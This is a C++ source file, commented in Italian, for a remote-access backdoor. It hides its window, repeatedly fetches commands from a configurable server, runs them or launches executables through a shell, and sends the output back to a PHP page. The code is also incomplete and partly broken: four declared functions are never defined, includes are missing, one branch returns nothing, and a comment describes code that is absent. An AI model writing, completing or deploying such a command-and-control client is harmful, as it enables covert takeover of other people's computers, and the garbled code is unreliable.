#include<iostream>
#include<array>

using namespace std;

string executeCommand(const string& command, bool getOutput); //aggiunta
string getCommand(const string& address, const string& page);
void sendOutput(const string& address, const string& page, const string& output);
bool sendHttpRequests(const string& address, const string& page, string& response, BOOL sendsParams, const string& data);
void hideWindow();
string URLEncode(const string& value); //aggiunta

string server = "localhost";
string shellNo = "0";
string shellFilePath = "/shell"+shellNo+".txt";
string outputPagePath = "/output.php";


int main(){

    string command;
    string result;
    int index;

    hideWindow();
    while (true){

        command = getCommand(server, shellFilePath);

        if(command.substr(0, 2) == "D|"){
            
            //metto in command il nome dell'eseguibile
            command = command.substr(2, command.size());

            executeCommand("start \"\" \""+command+"\"", false);
            sendOutput(server, outputPagePath, "Eseguito!");

        }
        else if(command != ""){
            
            result = executeCommand(command, true);
            if(result==""){

                sendOutput(server, outputPagePath, "output non letto");
            }
            else{
                sendOutput(server, outputPagePath, result);
            }

        }

        Sleep(5000);

    }


    return 0;

}

string executeCommand(const string& command, bool getOutput) {
    array<char, 128> buffer;
    string result;
    auto pipe = popen(command.c_str(), "r");
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }

    //nel caso di un esecuzione di un eseguibile bisogna bloccare la raccolta dell'output senò una volta eseguito
    //la shell si blocca
    if(getOutput){
        while (!feof(pipe)) {
            auto bytes = fread(buffer.data(), 1, buffer.size(), pipe);
            result += buffer.data();
        }
        return result;
    }

    /*
    
        Esegue il comando di sistema: popen(command.c_str(), "r")
        esegue il comando specificato e apre un canale di comunicazione per leggere l'output.

        Crea un unique_ptr: unique_ptr<FILE, decltype(&pclose)> crea un unique_ptr che gestisce il puntatore a file (FILE*)
        restituito da popen.

        Specifica il deallocatore: decltype(&pclose) indica che il deallocatore da utilizzare è pclose,
        assicurando che il canale venga chiuso correttamente quando il unique_ptr esce dallo scope.
    
    */

}

string URLEncode(const string& value) {
    ostringstream escaped;
    escaped.fill('0');
    escaped << hex;

    for (char c : value) {
        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << '%' << setw(2) << (int)(unsigned char)c;
        }
    }

    return escaped.str();
}